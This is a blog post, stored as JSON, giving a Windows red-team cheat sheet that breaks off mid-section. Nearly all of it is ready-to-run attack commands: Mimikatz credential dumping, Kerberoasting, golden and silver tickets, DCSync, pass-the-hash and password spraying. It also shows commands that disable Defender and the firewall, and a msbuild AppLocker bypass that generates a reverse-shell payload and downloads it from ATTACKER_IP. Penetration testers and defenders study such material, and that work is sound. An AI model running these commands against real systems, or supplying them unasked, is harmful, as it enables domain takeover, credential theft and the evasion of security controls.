{"title":"Windows Red Team Cheat Sheet","uid":"4da614f2089b6628415f50fed745da80","slug":"WinRedTeamCheatSheet","date":"2022-04-20T08:21:13.000Z","updated":"2022-04-20T09:40:01.985Z","comments":true,"path":"api/articles/WinRedTeamCheatSheet.json","keywords":"security, ctf, redteam, programming, hacking, python, golang, linux, windows, hackthebox, ctftime","cover":"/post/WinRedTeamCheatSheet/cover.jpg","content":"<p>List of tools and techniques required by the red team.</p>\n<div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">TIP</p>\n<p>The contents of this post have been collected from various books and repositories.</p>\n</div>\n<h2 id=\"Reconnaissance\"><a href=\"#Reconnaissance\" class=\"headerlink\" title=\"Reconnaissance\"></a>Reconnaissance</h2><h3 id=\"system-information\"><a href=\"#system-information\" class=\"headerlink\" title=\"system information\"></a>system information</h3><table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Descriptions</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>systeminfo</td>\n<td>This tool displays operating system configuration information for a local or remote machine, including service pack levels.</td>\n</tr>\n<tr>\n<td>hostname</td>\n<td>Prints the name of the current host.</td>\n</tr>\n</tbody></table>\n<h3 id=\"Accounts\"><a href=\"#Accounts\" class=\"headerlink\" title=\"Accounts\"></a>Accounts</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">net <span class=\"token function\">users</span>\nnet localgroups\nnet localgroup Administrators\nnet user <span class=\"token operator\">&lt;</span>USERNAME<span class=\"token operator\">></span>\n\n<span class=\"token comment\"># Crosscheck local and domain too</span>\nnet user <span class=\"token operator\">&lt;</span>USERNAME<span class=\"token operator\">></span> /domain\nnet group Administrators /domain\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Network-information\"><a href=\"#Network-information\" class=\"headerlink\" title=\"Network information\"></a>Network information</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">ipconfig /all\nroute print\narp -A\n\n<span class=\"token comment\"># Network connections</span>\n<span class=\"token function\">netstat</span> -ano<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Processes-And-Services\"><a href=\"#Processes-And-Services\" class=\"headerlink\" title=\"Processes And Services\"></a>Processes And Services</h3><pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token comment\"># Running processes</span>\ntasklist <span class=\"token operator\">/</span>SVC\n\n<span class=\"token function\">sc</span> query state= all <span class=\"token punctuation\">|</span> findstr <span class=\"token string\">\"SERVICE_NAME:\"</span> >> a &amp; <span class=\"token keyword\">FOR</span> <span class=\"token operator\">/</span>F <span class=\"token string\">\"tokens=2 delims= \"</span> <span class=\"token operator\">%</span>i in <span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span> <span class=\"token keyword\">DO</span> @<span class=\"token function\">echo</span> <span class=\"token operator\">%</span>i >> b &amp; <span class=\"token keyword\">FOR</span> <span class=\"token operator\">/</span>F <span class=\"token operator\">%</span>i in <span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">DO</span> @<span class=\"token punctuation\">(</span>@<span class=\"token function\">echo</span> <span class=\"token operator\">%</span>i &amp; @<span class=\"token function\">echo</span> <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span> &amp; @<span class=\"token function\">sc</span> qc <span class=\"token operator\">%</span>i <span class=\"token punctuation\">|</span> findstr <span class=\"token string\">\"BINARY_PATH_NAME\"</span> &amp; @<span class=\"token function\">echo</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span> &amp; <span class=\"token function\">del</span> a 2>nul &amp; <span class=\"token function\">del</span> b 2>nul<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Privileges-Escalation\"><a href=\"#Privileges-Escalation\" class=\"headerlink\" title=\"Privileges Escalation\"></a>Privileges Escalation</h2><h3 id=\"PowerShellMafia\"><a href=\"#PowerShellMafia\" class=\"headerlink\" title=\"PowerShellMafia\"></a>PowerShellMafia</h3><ul>\n<li><a href=\"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1\">github repository</a></li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">powershell.exe -c <span class=\"token string\">\"Import-Module C:\\Users\\Public\\PowerUp.ps1; Invoke-AllChecks\"</span>\npowershell.exe -c <span class=\"token string\">\"Import-Module C:\\Users\\Public\\Get-System.ps1; Get-System\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"Unquoted-paths\"><a href=\"#Unquoted-paths\" class=\"headerlink\" title=\"Unquoted paths\"></a>Unquoted paths</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">wmic <span class=\"token function\">service</span> get name,displayname,pathname,startmode <span class=\"token operator\">|</span>findstr /i <span class=\"token string\">\"Auto\"</span> <span class=\"token operator\">|</span>findstr /i /v <span class=\"token string\">\"C:\\Windows<span class=\"token entity\" title=\"\\\\\">\\\\</span>\"</span> <span class=\"token operator\">|</span>findstr /i /v<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"Juicy-Potato\"><a href=\"#Juicy-Potato\" class=\"headerlink\" title=\"Juicy Potato\"></a>Juicy Potato</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">C:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>Temp<span class=\"token punctuation\">\\</span>JuicyPotato.exe -p cmd.exe -a <span class=\"token string\">\"/c whoami > C:\\Users\\Public\\whoami.txt\"</span> -t * -l <span class=\"token number\">1031</span> -c <span class=\"token punctuation\">&#123;</span>d20a3293-3341-4ae8-9aaf-8e397cb63c34<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"Kerberoast\"><a href=\"#Kerberoast\" class=\"headerlink\" title=\"Kerberoast\"></a>Kerberoast</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># Rubeus </span>\n.<span class=\"token punctuation\">\\</span>.rubeus.exe kerberoast /creduser:ecorp<span class=\"token punctuation\">\\</span>hsnhk /credpassword:pass1234\n\n<span class=\"token comment\"># List available tickets</span>\nsetspn.exe -t evil.corp -q */*\npowershell.exe -exec bypass -c <span class=\"token string\">\"Import-Module .\\GetUserSPNs.ps1\"</span>\ncscript.exe GetUserSPNs.ps1\n\n<span class=\"token comment\"># List cached tickets</span>\nInvoke-Mimikatz -Command <span class=\"token string\">'\"kerberos::list\"'</span>\npowershell.exe -c <span class=\"token string\">\"klist\"</span>\npowershell.exe -c <span class=\"token string\">\"Import-Module C:\\Users\\Public\\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command '\"</span>kerberos::list<span class=\"token string\">\"'\"</span>\n\n<span class=\"token comment\"># Request tickets </span>\nAdd-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class=\"token string\">\"HTTP/web01.medin.local\"</span>\n\n<span class=\"token comment\"># Requesting remotely</span>\npython GetUserSPNs.py -request ECORP/hsnhk:supersecurepassword@127.0.0.1\n\n<span class=\"token comment\"># Extract tickets</span>\npowershell.exe -c <span class=\"token string\">\"Import-Module C:\\Users\\Public\\Invoke-Kerberoast.ps1; Invoke-Kerberoast -OutputFormat Hashcat\"</span>\nInvoke-Mimikatz -Command <span class=\"token string\">'\"kerberos::list /export\"'</span>\n\n<span class=\"token comment\"># Crack Tickets</span>\npython tgsrepcrack.py /usr/share/wordlists/rockyou.txt ticket.kirbi<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Stored-Credential\"><a href=\"#Stored-Credential\" class=\"headerlink\" title=\"Stored Credential\"></a>Stored Credential</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># To check if there is any stored keyscmdkey /list</span>\n\n<span class=\"token comment\"># Using them</span>\nrunas /user:administrator /savecred <span class=\"token string\">\"cmd.exe /k whoami\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Impersonating-Tokens-with-meterpreter\"><a href=\"#Impersonating-Tokens-with-meterpreter\" class=\"headerlink\" title=\"Impersonating Tokens with meterpreter\"></a>Impersonating Tokens with meterpreter</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">use incognito\nlist_tokens -u\nimpersonate_token NT-AUTHORITY<span class=\"token punctuation\">\\</span>System<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools\"></a>Tools</h3><table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Descriptions</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a href=\"https://github.com/PowerShellMafia/PowerSploit\">PowerSploit</a></td>\n<td>PowerSploit - A PowerShell Post-Exploitation Framework</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/rasta-mouse/Sherlock\">Sherlock</a></td>\n<td>PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/ohpe/juicy-potato\">Juicy Potato</a></td>\n<td>A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\\SYSTEM.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/GhostPack/Rubeus\">Rubeus</a></td>\n<td>Rubeus is a C# toolset for raw Kerberos interaction and abuses.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/gentilkiwi/mimikatz\">Mimikatz</a></td>\n<td>mimikatz is a tool I’ve made to learn C and make somes experiments with Windows security.</td>\n</tr>\n</tbody></table>\n<h2 id=\"Lateral-Movement\"><a href=\"#Lateral-Movement\" class=\"headerlink\" title=\"Lateral Movement\"></a>Lateral Movement</h2><h3 id=\"Mimikatz-Ticket-PTH\"><a href=\"#Mimikatz-Ticket-PTH\" class=\"headerlink\" title=\"Mimikatz Ticket PTH\"></a>Mimikatz Ticket PTH</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">Enable-PSRemoting\nmimikatz.exe <span class=\"token string\">'\" kerberos:ptt C:\\Users\\Public\\ticketname.kirbi\"'</span> <span class=\"token string\">\"exit\"</span>\nEnter-PSSession -ComputerName ECORP\n\nInvoke-Mimikatz -Command <span class=\"token string\">'\"sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:command\"'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"WinRM\"><a href=\"#WinRM\" class=\"headerlink\" title=\"WinRM\"></a>WinRM</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> ConvertTo-SecureString <span class=\"token string\">'supersecurepassword'</span> -AsPlainText -Force\n<span class=\"token variable\">$cred</span> <span class=\"token operator\">=</span> New-Object System.Management.Automation.PSCredential <span class=\"token punctuation\">(</span><span class=\"token string\">'ECORP.local\\hsnhk'</span>, <span class=\"token variable\">$pass</span><span class=\"token punctuation\">)</span>\nInvoke-Command -ComputerName DC -Credential <span class=\"token variable\">$cred</span> -ScriptBlock <span class=\"token punctuation\">&#123;</span> <span class=\"token function\">whoami</span> <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\"># Evil-WinRM</span>\nruby evil-winrm.rb -i <span class=\"token number\">192.168</span>.1.2 -u hsnhk -p hsnhk -r evil.corp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Tools-1\"><a href=\"#Tools-1\" class=\"headerlink\" title=\"Tools\"></a>Tools</h3><table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Descriptions</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a href=\"https://github.com/Hackplayers/evil-winrm\">Evil-WinRM</a></td>\n<td>This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985), of course only if you have credentials and permissions to use it.</td>\n</tr>\n</tbody></table>\n<h2 id=\"Database-Links\"><a href=\"#Database-Links\" class=\"headerlink\" title=\"Database Links\"></a>Database Links</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># PowerUpSQL</span>\nhttps://github.com/NetSPI/PowerUpSQL\n\nGet-SQLServerLink -Instance server -Verbose\npowershell.exe -c <span class=\"token string\">\"Import-Module C:\\Users\\Public\\PowerUpSQL.ps1; Invoke-SQLEscalatePriv -Verbose -Instance ECORP\\sql\"</span>\n\n<span class=\"token comment\"># To see servers </span>\n<span class=\"token keyword\">select</span> srvname from master<span class=\"token punctuation\">..</span>sysservers<span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\"># Native</span>\nGet-SQLServerLinkCrawl -Instance server -Query <span class=\"token string\">\"exec master..xp_cmdshell 'whoami'\"</span>\n\n<span class=\"token comment\"># Linked database tables</span>\n<span class=\"token keyword\">select</span> * from openquery<span class=\"token punctuation\">(</span><span class=\"token string\">\"ECORP\\FOO\"</span>, <span class=\"token string\">'select TABLE_NAME from FOO.INFORMATION_SCHEMA.TABLES'</span><span class=\"token punctuation\">)</span> \n\n<span class=\"token comment\"># You can also use meterpreter module exploit/windows/mssql/mssql_linkcrawler</span>\n<span class=\"token comment\"># With meterpreter module you can find linked databases and if you are admin on them</span>\n\n<span class=\"token comment\"># You can do a query and try to enable xp_cmpshell on that server</span>\n<span class=\"token keyword\">select</span> * from openquery<span class=\"token punctuation\">(</span><span class=\"token string\">\"server\"</span>,<span class=\"token string\">'select * from master..sysservers'</span><span class=\"token punctuation\">)</span> EXECUTE AS <span class=\"token environment constant\">USER</span> <span class=\"token operator\">=</span> <span class=\"token string\">'internal_user'</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'sp_configure \"xp_cmdshell\",1;reconfigure;'</span><span class=\"token punctuation\">)</span> AT <span class=\"token string\">\"server\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Golden-and-Silver-Tickets\"><a href=\"#Golden-and-Silver-Tickets\" class=\"headerlink\" title=\"Golden and Silver Tickets\"></a>Golden and Silver Tickets</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># Golden Ticket</span>\n<span class=\"token comment\"># Extract the hash of the krbtgt user</span>\nlsadump::dcsync /domain:evil.corp /user:krbtgt\nlsadump::lsa /inject\nlsadump:::lsa /patch\nlsadump::trust /patch\n\n<span class=\"token comment\"># creating the ticket </span>\n<span class=\"token comment\"># /rc4 or /krbtgt - the NTLM hash</span>\n<span class=\"token comment\"># /sid you will get this from krbtgt dump</span>\n<span class=\"token comment\"># /ticket parameter is optional but default is ticket.kirbi</span>\n<span class=\"token comment\"># /groups parameter is optional but default is 513,512,520,518,519</span>\n<span class=\"token comment\"># /id you can fake users and supply valid Administrator id </span>\n\nkerberos::golden /user:hsnhk /domain:evil.corp /sid:domains-sid /krbtgt:krbtgt-hash /ticket:ticket.kirbi /groups:501,502,513,512,520,518,519 \nkerberos::ptt golden.tck <span class=\"token comment\"># you can also add /ptt at the kerberos::golden command</span>\n<span class=\"token comment\"># After this , final ticket must be ready</span>\n\n<span class=\"token comment\"># You can now verify that your ticket is in your cache </span>\npowershell.exe -c <span class=\"token string\">\"klist\"</span>\n<span class=\"token comment\"># Verify that golden ticket is working</span>\n<span class=\"token function\">dir</span> <span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>DC<span class=\"token punctuation\">\\</span>C$\npsexec.exe <span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>DC cmd.exe\n\n<span class=\"token comment\"># Purge the currently cached kerberos ticket</span>\nkerberos::purge \n\n<span class=\"token comment\">#metasploit module can also be used for golden ticket, it loads the ticket into given session</span>\npost/windows/escalate/golden_ticket \n\n<span class=\"token comment\"># Silver Ticket</span>\n<span class=\"token comment\"># Silver Ticket allows escalation of privileges on DC</span>\n<span class=\"token comment\"># /target t he server/computer name where the service is hosted (ex: share.server.local, sql.server.local:1433, ...)</span>\n<span class=\"token comment\"># /service - The service name for the ticket (ex: cifs, rpcss, http, mssql, ...)</span>\n\n<span class=\"token comment\"># Examples</span>\nkerberos::golden /user:hsnhk /domain:domain /sid:domain-sid /target:evilcorp-sql102.evilcorp.local.1433 /service:MSSQLSvc /rc4:service-hash /ptt /id:1103\nsqlcmd -S evilcorp-sql102.evilcorp.local\n<span class=\"token keyword\">select</span> SYSTEM_USER<span class=\"token punctuation\">;</span>\nGO\n\nkerberos::golden /user:JohnDoe /id:500 /domain:targetdomain.com /sid:S-1-5-21-1234567890-123456789-1234567890 /target:targetserver.targetdomain.com /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"AD-Attacks\"><a href=\"#AD-Attacks\" class=\"headerlink\" title=\"AD Attacks\"></a>AD Attacks</h2><h3 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">enum4linux -a <span class=\"token number\">192.168</span>.1.2\npython windapsearch.py -u hsnhk -p hsnhk -d evil.corp --dc-ip <span class=\"token number\">192.168</span>.1.2\npython ad-ldap-enum.py -d contoso.com -l <span class=\"token number\">10.0</span>.0.1 -u Administrator -p P@ssw0rd<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Bruteforce-on-ldap\"><a href=\"#Bruteforce-on-ldap\" class=\"headerlink\" title=\"Bruteforce on ldap\"></a>Bruteforce on ldap</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">Import-Module .<span class=\"token punctuation\">\\</span>DomainPasswordSpray.ps1\nInvoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt\n\n<span class=\"token comment\"># Password brute</span>\n./kerbrute_linux_amd64 bruteuser -d evil.corp --dc <span class=\"token number\">192.168</span>.1.2 rockyou.txt hsnhk\n\n<span class=\"token comment\"># Username brute</span>\n./kerbrute_linux_amd64 userenum -d evil.corp --dc <span class=\"token number\">192.168</span>.1.2 users.txt\n\n<span class=\"token comment\"># Password spray</span>\n./kerbrute_linux_amd64 passwordspray -d evil.corp --dc <span class=\"token number\">192.168</span>.1.2 users.txt rockyou.txt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"DC-Shadow\"><a href=\"#DC-Shadow\" class=\"headerlink\" title=\"DC Shadow\"></a>DC Shadow</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#Find sid for that user</span>\nwmic useraccount where <span class=\"token punctuation\">(</span>name<span class=\"token operator\">=</span><span class=\"token string\">'administrator'</span> and <span class=\"token assign-left variable\">domain</span><span class=\"token operator\">=</span><span class=\"token string\">'%userdomain%'</span><span class=\"token punctuation\">)</span> get name,sid\n\n<span class=\"token comment\">#This will create a RPC Server and listen</span>\nlsadump::dcshadow /object:<span class=\"token string\">\"CN=hsnhk,OU=Business,OU=Users,OU=ECORP,DC=ECORP,DC=local\"</span> /attribute:sidhistory /value:sid\n\n<span class=\"token comment\"># Run this from another mimikatz</span>\nlsadump::dcshadow /push\n\n<span class=\"token comment\"># After this unregistration must be done</span>\n<span class=\"token comment\"># Relogin</span>\n\nlsadump::dcsync /domain:ECORP.local /account:krbtgt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"DC-Sync\"><a href=\"#DC-Sync\" class=\"headerlink\" title=\"DC Sync\"></a>DC Sync</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#####</span>\nlsadump::dcsync /domain:domain /all /csv\nlsadump::dcsync /user:krbtgt\n\n<span class=\"token comment\">#####</span>\nhttps://gist.github.com/monoxgas/9d238accd969550136db\npowershell.exe -c <span class=\"token string\">\"Import-Module .\\Invoke-DCSync.ps1; Invoke-DCSync -PWDumpFormat\"</span>\n\n<span class=\"token comment\">#####</span>\npython secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc<span class=\"token punctuation\">\\</span><span class=\"token variable\">$@</span><span class=\"token number\">10.0</span>.0.1\npython secretsdump.py -system /tmp/SYSTEM -ntds /tmp/ntds.dit LOCAL<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Tools-2\"><a href=\"#Tools-2\" class=\"headerlink\" title=\"Tools\"></a>Tools</h3><table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Descriptions</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a href=\"https://github.com/CiscoCXSecurity/enum4linux\">enum4linux </a></td>\n<td>enum4Linux is a Linux alternative to enum.exe for enumerating data from Windows and Samba hosts</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/ropnop/windapsearch\">windapsearch</a></td>\n<td>Python script to enumerate users, groups and computers from a Windows domain through LDAP queries</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/CroweCybersecurity/ad-ldap-enum\">ad-ldap-enum</a></td>\n<td>An LDAP based Active Directory user and group enumeration tool</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/dafthack/DomainPasswordSpray\">DomainPasswordSpray</a></td>\n<td>DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/ropnop/kerbrute\">Kerbrute</a></td>\n<td>A tool to perform Kerberos pre-auth bruteforcing</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py\">secretsdump.py</a></td>\n<td>Performs various techniques to dump hashes from the remote machine without executing any agent there.</td>\n</tr>\n</tbody></table>\n<h2 id=\"Bypass-Evasion-Techniques\"><a href=\"#Bypass-Evasion-Techniques\" class=\"headerlink\" title=\"Bypass-Evasion Techniques\"></a>Bypass-Evasion Techniques</h2><h3 id=\"Windows-Defender\"><a href=\"#Windows-Defender\" class=\"headerlink\" title=\"Windows Defender\"></a>Windows Defender</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">sc config WinDefend <span class=\"token assign-left variable\">start</span><span class=\"token operator\">=</span> disabled\nsc stop WinDefend\n<span class=\"token comment\"># Powershell</span>\nSet-MpPreference -DisableRealtimeMonitoring <span class=\"token variable\">$true</span>\n<span class=\"token comment\"># Remove definitions</span>\n<span class=\"token string\">\"%Program Files%\\Windows Defender\\MpCmdRun.exe\"</span> -RemoveDefinitions -All<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Firewall\"><a href=\"#Firewall\" class=\"headerlink\" title=\"Firewall\"></a>Firewall</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">Netsh Advfirewall show allprofiles\nNetSh Advfirewall <span class=\"token builtin class-name\">set</span> allprofiles state off<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"Ip-Whitelisting\"><a href=\"#Ip-Whitelisting\" class=\"headerlink\" title=\"Ip Whitelisting\"></a>Ip Whitelisting</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">New-NetFirewallRule -Name hsnhkinbound -DisplayName hsnhkinbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"Applocker-ByPass\"><a href=\"#Applocker-ByPass\" class=\"headerlink\" title=\"Applocker ByPass\"></a>Applocker ByPass</h3><ul>\n<li>References<ul>\n<li><a href=\"https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md\">Generic AppLocker bypasses</a></li>\n<li><a href=\"https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md\">Verified AppLocker Bypasses</a> </li>\n<li><a href=\"https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md\">DLL Execution</a></li>\n</ul>\n</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># Multistep process to bypass applocker via MSBuild.exe:</span>\nmsfvenom -p windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.1.56 <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">9001</span>  -f csharp -e x86/shikata_ga_nai -i  <span class=\"token operator\">></span> out.cs \n\n<span class=\"token comment\"># Replace the buf-sc and save it as out.csproj</span>\nhttps://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml\n\nInvoke-WebRequest <span class=\"token string\">\"http://ATTACKER_IP/payload.csproj\"</span> -OutFile <span class=\"token string\">\"out.csproj\"</span><span class=\"token punctuation\">;</span> C:<span class=\"token punctuation\">\\</span>windows<span class=\"token punctuation\">\\</span>Microsoft.NET<span class=\"token punctuation\">\\</span>Framework<span class=\"token punctuation\">\\</span>v4.0.30319<span class=\"token punctuation\">\\</span>msbuild.exe .<span class=\"token punctuation\">\\</span>out.csproj\n\n<span class=\"token comment\"># or you can simply use my tool :)</span>\nhttps://github.com/hsnhk/Msbuild-payload-generator\n<span class=\"token function\">sudo</span> python msbuild_gen.py -a x86 -i <span class=\"token number\">10</span> --lhost <span class=\"token number\">192.168</span>.220.130 --lport <span class=\"token number\">9001</span> -m<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"GreatSCT\"><a href=\"#GreatSCT\" class=\"headerlink\" title=\"GreatSCT\"></a>GreatSCT</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code 